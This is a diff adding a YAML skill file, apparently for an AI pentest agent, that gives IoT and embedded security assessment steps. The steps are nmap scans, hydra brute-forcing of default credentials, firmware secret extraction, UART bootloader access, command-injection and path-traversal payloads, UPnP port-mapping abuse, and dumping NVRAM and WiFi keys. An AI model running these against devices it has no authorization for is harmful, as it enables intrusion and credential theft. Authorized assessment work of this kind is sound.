@@ -1,0 +1,118 @@
+schema_version: 1
+version: 3.0.0
+name: iot-embedded-security
+description: >
+  IoT and embedded systems security assessment covering firmware extraction/analysis,
+  UART/JTAG hardware interface exploitation, default credential attacks, UPnP/mDNS
+  service discovery, Telnet/SSH weak auth, API backend discovery from firmware,
+  bootloader bypass, and hardcoded secret extraction from binaries.
+triggers:
+  - iot security
+  - embedded security
+  - firmware analysis
+  - firmware extraction
+  - uart
+  - jtag
+  - binwalk
+  - default credentials
+  - upnp
+  - mdns
+  - telnet attack
+  - hardcoded secrets
+  - iot pentest
+  - embedded pentest
+  - nvram
+tools:
+  - nmap
+  - python3
+knowledge: |
+  IoT and embedded devices often run stripped-down Linux or RTOS with minimal security controls.
+  Attack surface spans physical interfaces (UART/JTAG), network services (Telnet, HTTP, UPnP),
+  firmware binaries (hardcoded credentials, debug paths, cleartext secrets), and cloud backends.
+
+  1. NETWORK SERVICE DISCOVERY:
+     Full port scan including UDP (UPnP, SNMP, mDNS):
+       nmap -sV -sU -p T:1-65535,U:1900,5353,161,67,68 -T4 --open TARGET_IP
+     UPnP device enumeration:
+       nmap -sU -p 1900 --script upnp-info TARGET_SUBNET/24
+       curl -s -m 3 "http://TARGET_IP:1900/" | head -20
+     mDNS service discovery (Bonjour/Avahi):
+       nmap -p 5353 --script dns-service-discovery TARGET_SUBNET/24
+     Telnet (typically 23): nmap -sV -p 23 TARGET_IP
+     SSH (22, 2222): nmap -sV -p 22,2222 TARGET_IP
+
+  2. DEFAULT CREDENTIAL ATTACK:
+     Common IoT default creds (try all before custom):
+       admin:admin  admin:password  admin:1234  admin:  root:root
+       root:toor    root:password   root:admin  user:user
+     Tool-assisted: hydra -l admin -P /usr/share/seclists/Passwords/Default-Credentials/router-defaults.txt \
+       -t 4 ssh://TARGET_IP
+     Telnet: echo -e "admin\nadmin\n" | nc -w 3 TARGET_IP 23
+
+  3. FIRMWARE EXTRACTION & ANALYSIS:
+     Download firmware from vendor site or extract from device update stream
+     If binary:
+       binwalk -e firmware.bin              →  extract filesystem, identify file types
+       binwalk -A firmware.bin              →  CPU architecture detection
+     Search for credentials and secrets in extracted filesystem:
+       grep -rE "(password|passwd|secret|api_key|token|SSID)\s*=\s*" squashfs-root/ --include="*.conf"
+       grep -rE "(password|passwd|secret)\s*=" squashfs-root/ --include="*.xml"
+     Find web interface admin password hash in /etc/passwd, /etc/shadow, /etc/config/
+     Extract private keys: find squashfs-root/ -name "*.pem" -o -name "*.key" -o -name "*.crt"
+
+  4. BINARY HARDCODED SECRET EXTRACTION:
+     Using strings and grep on binary files:
+       strings firmware_binary | grep -E "(BEGIN PRIVATE|admin|password|secret|key=)"
+     Using binwalk for entropy analysis (find encrypted sections):
+       binwalk -E firmware.bin                  →  entropy graph, high entropy = encrypted/compressed
+     radare2 for deeper static analysis:
+       r2 -A binary_file -q -c "afl~main;pdf@main;iz~password" 2>/dev/null
+
+  5. UART / PHYSICAL INTERFACE ENUMERATION (when hardware access available):
+     Identify UART pins (TX, RX, GND, VCC) with multimeter — RX/TX are 3.3V logic
+     Common UART baud rates to try: 115200, 9600, 57600, 38400, 19200
+     Connect USB-to-UART adapter, use minicom or picocom:
+       minicom -D /dev/ttyUSB0 -b 115200
+     Interrupt boot sequence (press any key or Ctrl+C) to get bootloader shell (U-Boot, CFE)
+     U-Boot boot interrupt → uboot commands → printenv (shows config), bootm (load custom kernel)
+
+  6. WEB INTERFACE ATTACK SURFACE:
+     Extract web routes from firmware: grep -rE "location /" squashfs-root/
+     Identify CGI scripts: find squashfs-root/ -name "*.cgi" -type f
+     Test common IoT web vulns:
+       Command injection in ping/traceroute forms:  127.0.0.1; id
+       Path traversal in file manager:              /cgi-bin/download?file=../../etc/passwd
+       CSRF on admin actions (most IoT webUI lacks CSRF protection)
+       Static admin credentials in source:          grep -r "var password" squashfs-root/www/
+
+  7. UPNP ATTACK SURFACE:
+     UPnP port mapping abuse (add NAT rules from internal network):
+       python3 -c "
+       import socket
+       ssdp_req = 'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n'
+       s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+       s.sendto(ssdp_req.encode(), ('239.255.255.250', 1900))
+       s.settimeout(3)
+       while True:
+           try: print(s.recv(2048).decode())
+           except: break
+       "
+     UPnP port forward abuse: AddPortMapping to expose internal services externally
+
+  8. NVRAM / CONFIG DUMP:
+     On devices with shell access (via UART or exploited Telnet):
+        nvram show                    →  all NVRAM variables including WiFi PSK, admin creds
+       cat /etc/config/network       →  OpenWrt network config
+       cat /proc/sys/kernel/hostname →  hostname leakage
+       # Read WiFi supplicant config (contains PSK): cat /etc/wpa_supplicant.conf
+
+  IMPACT: Full device compromise, network lateral movement via compromised router/IoT,
+  credential theft for cloud backends, firmware backdoor installation.
+references:
+  - https://owasp.org/www-project-internet-of-things/
+  - https://attack.mitre.org/matrices/ics/
+  - https://github.com/ReFirmLabs/binwalk
+  - https://github.com/attify/firmware-analysis-toolkit
+provenance:
+  origin: builtin
+  source: persona/v0.1/skills/iot-embedded-security.yaml
